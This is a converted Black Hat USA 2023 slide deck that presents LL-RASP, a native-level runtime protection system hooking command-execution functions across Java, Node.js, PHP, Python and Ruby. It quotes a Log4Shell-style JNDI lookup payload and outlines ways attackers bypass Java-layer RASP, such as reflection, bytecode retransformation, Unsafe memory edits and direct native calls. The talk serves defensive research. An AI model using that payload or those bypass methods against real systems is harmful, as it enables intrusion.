---
title: "Low-level RASP Protecting Applications Implemented in High-level Programming Languages"
speakers: ["Zhuonan Li", "Qi Li", "Zimin Lin"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Zhuonan Li & Qi Li & Zimin Lin_Low-level RASP Protecting Applications Implemented in High-level Programming Languages.pdf"
pages: 25
sha256: "5e2b47fe64bc102434ba6aaaea087fdcf5fdb63f4a980b526a0635b9e3847636"
text_chars: 17648
ocr_pages: 1
has_ocr: true
redacted_secrets: 0
ocr_confidence: 91.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:26:41Z"
---
# Low-level RASP Protecting Applications Implemented in High-level Programming Languages

**Speakers:** Zhuonan Li, Qi Li, Zimin Lin  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Zhuonan Li & Qi Li & Zimin Lin_Low-level RASP Protecting Applications Implemented in High-level Programming Languages.pdf` (25 pages)


## Slide 1

# Low-level RASP: Protecting Applications Implemented in High-level Programming Languages

Speaker: <u>zhuonan li</u>

Contributors: <u>Qi Li, Zimin Lin</u>

#BHUSA   @BlackHatEvents

## Slide 2

## Abstract

During the emergency response process of application-level 0day vulnerabilities, RASP (Runtime Application Self Protection) usually has a better defense performance than WAF (Web Application Firewall) and HIPS (Host-based Intrusion Prevention System) because it can obtain the context (stack, method, parameter, etc.) inside the application. Take an enterprise as an example, different business teams may choose different high-level programming languages (HPL) as their main languages in software development based on their business characteristics. However, RASP can only provide defense capabilities for a specific HPL.

LL-RASP is a new runtime defense technology that we invented when we faced these problems, and it can solve these problems with lower cost and better performance. It abstracts general capabilities such as information collection, environment monitoring, rule maintenance, health check, general hook, RPC&IPC, etc. If you want to use runtime defense capabilities to protect your applications in other HPLs such as Ruby, all you need to do is use dozens of lines of code to implement a lightweight extension.

In this talk, I will take Java, NodeJS, PHP, Python and Ruby as examples to demonstrate how LL-RASP can empower security teams to be more agile and effective than ever before when protecting applications in various HPLs.

#BHUSA   @BlackHatEvents

## Slide 3

## Who am I

Zhuonan Li (离兮) is a senior security engineer from 1AQ team (⽹络尖⼑) who devoted himself to Application Security, Mobile Security, and Vulnerability Exploitation.

My recent study has focused on **application security from a low-level perspective in order to provide a unified security solution for applications in different languages** . I also have been acknowledged by Microsoft, AT&T, and mail.ru, etc.

#BHUSA   @BlackHatEvents

## Slide 4

# Agenda

1. Background

2. Scenes

3. Design

4. Implementation

5. Demo

6. Effects

7. Takeaways

#BHUSA  @BlackHatEvents

## Slide 5

# Background

##### **RASP plays an important role**

Attack Requests
WAF Raw traffic matches the payload  ${jndi:ldap://${identity}.oast}  or its variants.
[1] The raw traffic
RASP [2]  The InitialContext.lookup method has been executed
[3] A network request to evil.site has been triggerred
HIPS A network request to public.dns has been triggered by App's process.

Background

Scenes

Design Implementation

Demo

Effects

Takeaways

#BHUSA  @BlackHatEvents

## Slide 6

# Scene 1: Offense & Defense

##### **RASP is not always effective**

Java Command Execution General Bypass Methodologies
JDK
1. Break the  execution flow
Runtime.getRuntime.exec Most RASP works on this layer.
eg. Attackers could break the execution flow by turn off RASP through
ProcessBuilder.start reflect or retransform the byte codes of RASP using Instrument.
UNIXProcess.<init> RASP is restricted here. 2. Break the  data flow
eg. Attackers could break the rule-check stage by forge the contexts
forkAndExec Call Native method from Java layer.
required by RASP or using Unsafe to modify the memory areas of rules.
3. Exploit to the  blind zone  of defense software.
F oreign  F unction  I nterface
eg. Attackers could call forkAndExec to bypass Java-layer Hook Points, or
libjvm.so call native method through FFI to exploit outside of the scope of RASP.
Java_xx_forkAndExec
Background Scenes Design Implementation Demo Effects Takeaways
Sence1 Sence2 Sence3
#BHUSA  @BlackHatEvents
FFI

eg. Attackers could call forkAndExec to bypass Java-layer Hook Points, or call native method through FFI to exploit outside of the scope of RASP.

#BHUSA  @BlackHatEvents

## Slide 7

# Scene 2: Performance Impact

**RASP has a poor performance when getting the stack trace**

RASP(JVMTI-based) get stack trace Potential performance improvements
JDK
Thread.currentThread.getStackTrace
Java ( HPL )
dumpThreads
• F oreign  F unction  I nterface(JNI here) call is slower than function call
inside native space.
J ava  N ative  I nterface • Can we get the  H igh-level  P rogramming  L anguage( HPL )  layer stack trace
FFI from native space directly?
libjvm.so • We don’t need all frame's stack trace.
• Can we get HPL-layer stack trace of frames in custom range?
JVM_DumpThreads
ThreadService::dump_stack_traces C/C++ ( Native )
ThreadSnapshot::get_stack_traces
Background Scenes Design Implementation Demo Effects Takeaways
Sence1 Sence2 Sence3
#BHUSA  @BlackHatEvents
JNI

- **F** oreign **F** unction **I** nterface(JNI here) call is slower than function call inside native space. • Can we get the **H** igh-level **P** rogramming **L** anguage( **HPL** )  layer stack trace from native space directly?

#BHUSA  @BlackHatEvents

## Slide 8

# Scene 3: Multiple HPL Environment

**It's difficult for RASP to secure multiple HPLs**

Business Environments Runtime Hook technologies
1. Apps running inside different containers in different HPLs.
The diversity of HPL creates greater challenges for security teams.
Container Container Container
Java App Node App Python App • Java:  JVMTI  • High implementation costs
• Node:  SIGUSR1  • Different Hook Technologies
Container Container Container
• Python: ?  • High deployment costs
…
PHP App Ruby App
• PHP: ?
• Different Deployment Methods
• Ruby: ?  • High maintenance costs
2. Processes running on seem host in different HPLs.
• … • Different Implementation Stacks
Host
Java Process Node Process Python Process
Most security teams cannot accept the cost of implementing RASP
PHP Process Ruby Process … separately for each HPL.
Background Scenes Design Implementation Demo Effects Takeaways
Sence1 Sence2 Sence3
#BHUSA  @BlackHatEvents

#BHUSA  @BlackHatEvents

## Slide 9

# Design

- Better defense effects.

- Secure Applications in different HPLs.

- Features needed by Large-scale

Background

Scenes

Design

Implementation

Demo

Effects

Takeaways

Goal

Defense

Refine Feature

#BHUSA  @BlackHatEvents

## Slide 10

# Design

#### **Set hook points as lower as possible and ensure be able to get the HPL-layer stack trace**

Java Command Execution Enhance the Defense capabilities
JDK
1. The more secure  execution flow
Runtime.getRuntime.exec Most RASP works on this layer.
eg. LL-RASP is working on native space, rather than byte codes in Java
layer, and there is currently no way for Java to modify the implementation
ProcessBuilder.start
of JVM.
UNIXProcess.<init> RASP is restricted here. 2. The more secure  data flow
eg. We use a technique called full-stack matching to solve this problem,
forkAndExec Call Native method from Java layer. and we have the ability to hook all memory-related(eg. sun.misc.Unsafe)
native functions with a lower performance impact.
3.  Dimensionality  defense
F oreign  F unction  I nterface
eg.  All HPL-layer Command Execution will eventually be executed through
FFI at native space.  Any JNI operations(eg. NativeLibrary.load) in Java
libjvm.so
can be observed inside JVM, but not vice versa.
Java_xx_forkAndExec Low-level RASP works this layer.
Background Scenes Design Implementation Demo Effects Takeaways
Goal Defense Refine Feature
#BHUSA  @BlackHatEvents
FFI

eg. LL-RASP is working on native space, rather than byte codes in Java layer, and there is currently no way for Java to modify the implementation of JVM.

eg.  All HPL-layer Command Execution will eventually be executed through FFI at native space.  Any JNI operations(eg. NativeLibrary.load) in Java can be observed inside JVM, but not vice versa.

#BHUSA  @BlackHatEvents

## Slide 11

# Design

#### **Unify HPL-independent things and make HPL-dependent part as simple as possible.**

#### HPL- **Independent** Part

HPL- **dependent** Part

librs_engine.so

librs_ **lang** .so

1. **Hook Module:** modify the executing logic of specific functions.

   - (eg. InlineHook, GOT Hook).

2. **Rule Module** : manage (eg. fetch, update) security rules for specific process.

   **1. Generate HPL-layer stack trace from native space.**

   **2. Define custom hook points for specific HPL.**

3. **Analyzer Module** : decide whether an action is needed accoriding to the event's context and security rules.

4. **Control Module** : receive and execute instructions from the daemon process (eg. install&uninstall probes).

Background

Scenes Design Implementation Demo Goal Defense Refine Feature

Effects Takeaways

#BHUSA  @BlackHatEvents

## Slide 12

# Design

#### **Features needed by Large-scale**

##### **Compatibility**

##### **Stability**

##### **Performance**

###### **Trusted Code**

**IPC**

###### **Process Injection**

- 0 dependencies unix domain socket

- • No Supply Chain Risk **RPC**

ptrace

- No Supply Chain Risk

- **Memory Safe**

**Independent with**

custom private protocol **De-optimizing**

- User Code

   - Extensions: valgrind

- Framework/Middleware

- UDS: Rust

No JIT related.

- Kernel

###### **Hash Verification**

###### **StackTrace**

- Only verified binaries can • No FFI be protected. • Custom Frame Range Design Implementation Demo

- Goal Defense Refine Feature

Background

Scenes Design Goal Defense

##### **Lower landing cost**

- Easy deploy

- Easy update

- Fewer prerequirements

- • Pluggable security modules.

Effects Takeaways

#BHUSA  @BlackHatEvents

## Slide 13

# Implementation

#### **The structure diagram and attack flowchart**

Attack Requests
Java Process
The Original
Gadgets Chain
Retransform
RASP Agent Byte Code
forkAndExec
FFI
F oreign  F unction  I nterface libjvm.so:  Java_xx_forkAndExec
The New Hooked Function
librs_jdk.so:  Java_xx_forkAndExec
LL-RASP Module Native Space
Hook
librs_ jdk .so libc.so binary librs_jdk.so:  Context (eg. HPL-layer stack trace)
librs_engine.so libdl.so libjvm.so librs_engine.so:  Actions(eg. deny, allow)
Background Scenes Design Implementation Demo Effects Takeaways
Flow View Java Node …
#BHUSA  @BlackHatEvents
FFI

## Slide 14

# Implementation

Java Process Node Process PHP Process Python Process
librs_ jdk .so librs_ js .so librs_ php .so librs_ py .so
librs_engine.so librs_engine.so librs_engine.so librs_engine.so
Instructions, Rules,
Security Events AF_UNIX
etc.
U niversal  D efense  S ystem

Ruby Process
librs_ rb .so
librs_engine.so

Env Monitor Security Modules (Traits) Status Monitor Communication
• Sync process/network Status  • Health check  • IPC
• Check CPU/MEM/Disk status.  Low-level RASPUDS • Keep Alive  • RPC
• Check and clean unneeded files  • Auto restore when needed.  • Perf events
generated by LL-RASP  • Hot Update  • NFLOG
• … • DefenseStatus Sync  • …
JavaAgent eBPF NetFilter • …

Background Scenes

Design Implementation
View Java

Demo Effects Takeaways
Node PHP …

#BHUSA  @BlackHatEvents

## Slide 15

# Implementation

### Lightweight extension: **librs_jdk.so**

Generate StackTrace (sample)

Hook Points (sample)

#include <jni.h>

void **install** () {

// …

void **dump_stack_trace** (JNIEnv *env, char* bt) { // …

jobject current_thread = **JVM_CurrentThread** ( // … // …

jobjectArray threads = **JVM_DumpThreads** ( // … // …

jobject current_ste_array = (*env)>GetObjectArrayElement(env, threads, 0); // …

jobject  current_ste = (*env)->GetObjectArrayElement // … jstring ste_string = (*env)->CallObjectMethod(env, // … char* a = (*env)-> **GetStringUTFChars** (env, ste_string, //… }

engine_module = dlopen_mode(RS_ENGINE_PATH,  // … // …

analyze_event = dlsym(engine_module, "analyze_event"); // …

struct elf_info **libjava** = get_elf_info(0," **libjava.so** "); // …

hook_module( **libjava** .path, " **Java_xx_forkAndExec** ", // … hook_module( **libjava** .path, " **NativeLibraries_load** ", // … // …

}

Background

Scenes

Design Implementation Java Node

Demo Effects Takeaways PHP Python Ruby #BHUSA  @BlackHatEvents

## Slide 16

# Implementation

### Lightweight extension: **librs_js.so**

Generate StackTrace (sample)

Hook Points (sample)

#include <node_api.h>

void **install** () {

// …

void **dump_stack_trace** (char* bt) { // …

v8::Isolate *isolate = v8::Isolate:: **GetCurrent** (); v8::Local<v8::StackTrace> st =

v8::StackTrace:: **CurrentStackTrace** (isolate, // … // …

frame = st-> **GetFrame** (isolate,// … int line = frame-> **GetLineNumber** (); v8::String::Utf8Value scriptName(isolate, frame> **GetScriptName** ());

v8::String::Utf8Value  funcName(isolate,frame> **GetFunctionName** ()); // … }

engine_module = dlopen_mode(RS_ENGINE_PATH,  // … // …

analyze_event = dlsym(engine_module, "analyze_event"); // …

struct elf_info **libnode** = get_elf_info(0," **libnode.so** "); // …

hook_module( **libnode** .path, " **uv_spawn** ",   // … // …

}

Background Scenes Design Implementation
Java Node

Demo Effects
PHP Python Ruby

Takeaways #BHUSA  @BlackHatEvents

## Slide 17

# Implementation

### Lightweight extension: **librs_php.so**

Generate StackTrace (sample)

Hook Points (sample)

#include <php.h>

void **dump_stack_trace** (char* bt) { // …

zval backtrace; **zend_fetch_debug_backtrace** (&backtrace, 0, 0, 0); zend_array *ht = Z_ARRVAL(backtrace); Bucket *p = ht->arData; // …

zval *z = p->val; string_key = p->key; char *t = ZSTR_VAL(string_key); if(strncmp(t, " **file** ", 4) || strncmp(t, " **function** ", 8)){ zend_string *z_str = **zval_get_string** (z); // … } // … }

void **install** () { // …

engine_module = dlopen_mode(RS_ENGINE_PATH,  // … // …

analyze_event = dlsym(engine_module, "analyze_event"); // …

char* **php_path** = get_binary_path( **getpid()** ); // …

hook_module( **php_path** , " **php_exec** ",   // … // … }

Background

Scenes

Design Implementation Java Node

Demo Effects PHP Python Ruby

Takeaways #BHUSA  @BlackHatEvents

## Slide 18

# Implementation

### Lightweight extension: **librs_py.so**

Generate StackTrace (sample)

Hook Points (sample)

#include <Python.h>

void **install** () {

// …

void **dump_stack_trace** (char* bt) {

// …

PyThreadState *t_state = **PyThreadState_Get** (); PyFrameObject *frame = t_state->frame;

int line = **PyCode_Addr2Line** (frame->f_code,frame-

>f_lasti);

// …

file_name = to_cstring( **frame->f_code->co_filename** );

func_name = to_cstring( **frame->f_code->co_name** ); // ….

engine_module = dlopen_mode(RS_ENGINE_PATH,  // … // …

analyze_event = dlsym(engine_module, "analyze_event"); // …

struct elf_info **libpython** = get_elf_info(0," **libpython** "); // …

hook_module( **libpython** .path, " **system** ",   // … // … }

}

Background Scenes

Design Implementation
Java Node

Demo Effects
PHP Python Ruby

Takeaways #BHUSA  @BlackHatEvents

## Slide 19

# Implementation

### Lightweight extension: **librs_rb.so**

Generate StackTrace (sample)

Hook Points (sample)

#include <ruby.h>

void **dump_stack_trace** (char* bt) {

// …

VALUE rb_bt = **rb_make_backtrace** (); VALUE a = rb_ary_join(rb_bt, rb_str_new_cstr("\n")); strncat(bt, rb_string_value_cstr(&a), 4096); // …. }

void **install** () { // … engine_module = dlopen_mode(RS_ENGINE_PATH,  // … // …

analyze_event = dlsym(engine_module, "analyze_event"); // …

struct elf_info **libruby** = get_elf_info(0," **libruby** "); // …

hook_module( **libruby** .path, " **rb_execarg_new** ",   // … // … }

Background Scenes

Design Implementation
Java Node

Demo Effects
PHP Python Ruby

Takeaways

#BHUSA  @BlackHatEvents

## Slide 20

# Demo

< 5min

Background

Scenes

Design

Implementation

Demo

Effects

Takeaways

#BHUSA  @BlackHatEvents

## Slide 21

# Demo

**< 5min**

Background

Scenes

Design

Implementation

Demo

Effects

Takeaways

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~ — kali@kali: ~/apps — ssh kali@192.168.50.83 root@kali: /opt/uds — ssh kali@192.168.50.83 untu-virtual-machine: ~ — ssh ubuntu@192.168.50.79 =2000 — com.docker.cli « docker exec -ti e mongosh
[+$ echo "There are 3 fake-vulnerable Applications implemented in Java, Node.js and Python in this environment CIP: “hostname -I~)."
There are 3 fake-vulnerable Applications implemented in Java, Node.js and Python in this environment CIP: 192.168.50.83 ).
total 20
drwxr-xr-x 2 kali kali 4096 Apr 12 11:06
kali kali 4096 Apr 12 10:56
kali kali 1133 Apr 12 10:54 App.java
kali kali 426 Apr 12 10:55 app.js
kali kali 372 Apr 12 10:56 app.py
```

## Slide 22

# Effects

##### **Efficiency** : The count of lines of code required to secure a HPL

HPL-Independent parts. HPL-dependent parts.
Total
Hook  Rule  Analyzer  Control
Generate StackTrace Define Hook Points
Module Module Module Module
Java 50+ 200 < 300
Node.js 50+ 150 < 300
PHP 0 0 0 0 100+ 100 < 300
Python 50+ 100 < 200
Ruby 10+ 100 < 200

Since we have implemented the general part uniformly, we only need to implement 2 functions to protecting a new HPL. The first function is to generate the HPL layer stack trace, the second function is to define custom hook points.

Background Scenes Design Implementation Demo Effects Takeaways

#BHUSA  @BlackHatEvents

## Slide 23

# Effects

- We have verified 600+ binaries of different HPLs including Java, Node.js, PHP and Python.

- This technology has been deployed to applications implemented in Java, Node.js, PHP and Python.

- Running stably for a year with 0 failures.

Background

Scenes

Implementation

Demo

Effects

Takeaways

Design

#BHUSA  @BlackHatEvents

## Slide 24

# Takeaways

- RASP can block many real-world attacks, but only for applications implemented in specific HPL.

- Most security teams **cannot accept** the development, deployment, maintenance and operational costs of implementing RASP for each HPL individually.

- **LL-RASP** has the advantages of both HIPS and RASP while avoids the disadvantages of each, and it can enable security teams to secure applications more agilely and effectively than ever before.

Background

Scenes

Design

Implementation

Demo

Effects

Takeaways

#BHUSA  @BlackHatEvents

## Slide 25

# Q&A

<u>zhuonan.lzn@gmail.com</u>

#BHUSA  @BlackHatEvents
